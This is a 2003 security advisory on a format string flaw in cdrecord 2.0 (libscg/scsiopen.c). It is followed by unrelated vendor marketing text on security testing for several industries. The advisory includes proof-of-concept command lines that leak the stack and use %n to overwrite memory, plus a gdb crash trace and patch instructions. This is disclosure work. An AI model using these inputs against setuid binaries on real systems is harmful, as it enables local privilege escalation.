----------------------------------------------------------------------------
PACKAGE           : cdrtools
VERSION           : 2.0
SUMMARY           : Format String
SEVERITY          : local root exploit if suid (on several distros)
DATE:             : 2003-05-05
----------------------------------------------------------------------------

Hi,
i would inform you that there is a format string vulnerability
in cdrecord 2.0 and in particular in libscg/scsiopen.c in line 273, i
suppose:

--------------------------------------------------------------
   271          if (scg__open(scgp, devname) <= 0) {
   272                  if (errs && scgp->errstr)

>>>273                     js_snprintf(errs, slen, scgp->errstr);<<<<

   274                  scg_sfree(scgp);
   275                  return ((SCSI *)0);
   276          }
_______________________________________________________
!-------         W A R N I N G      -----------!
!--- this  is an exploitable vulnerability! ---!
!----------------------------------------------!
Cdrecord is present in several distros as setuid program so this is a real
security hole.

e.g.
$ ./cdrecord dev="AAAA|%x%x%x%x%x%x%x%x%x%x%x" int.c

Cdrecord 2.0 (i586-pc-linux-gnu) Copyright (C) 1995-2002 Jrg Schilling
scsidev: 'AAAABBBBCCCC|%x%x%x%x%x%x%x%x%x%x%x%x'
devname: 'AAAABBBBCCCC|%x%x%x%x%x%x%x%x%x%x%x%x'
scsibus: -2 target: -2 lun: -2
Warning: Open by 'devname' is unintentional and not supported.
./cdrecord: File o directory inesistente. Cannot open
'AAAABBBBCCCC|65bffff6743808b7c8ffffffff000fffffffe4141414142424242.
Cannot open SCSI driver.
./cdrecord: For possible targets try 'cdrecord -scanbus'. Make sure you
are root.
as you can see th last %x refers to AAAABBBBCCC so i can use %n for
overwriting. anything i want:
e.g. i can find on the stack the location of the return address...
let's say 0xbffcffcc:
$./cdrecord dev=`printf
"\xec\xed\xff\xbfBBBBCCCC|%%x%%x%%x%%x%%x%%x%%x%%x%%n"`
c/int.c
.....snip....
(core dump)
$ gdb   `which cdrecord`  core -q
....snip...
#0  0x3f in ?? ()
(gdb) bt
#0  0x3f in ?? ()
#1  0x8065451 in scg_open ()
#2  0x8049a3b in main ()
...

so it's exploitable.

Solutions:

A. Updated package can be found on:

	ftp://ftp.berlios.de/pub/cdrecord/alpha/cdrtools-2.01a14.tar.gz

B. Replace line 273 of liscg/scsiopen.c with :
	 js_snprintf(errs, slen, "%s", scgp->errstr);

C. remove the suid bit with:
	chmod 755 `which cdrecord`

## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.
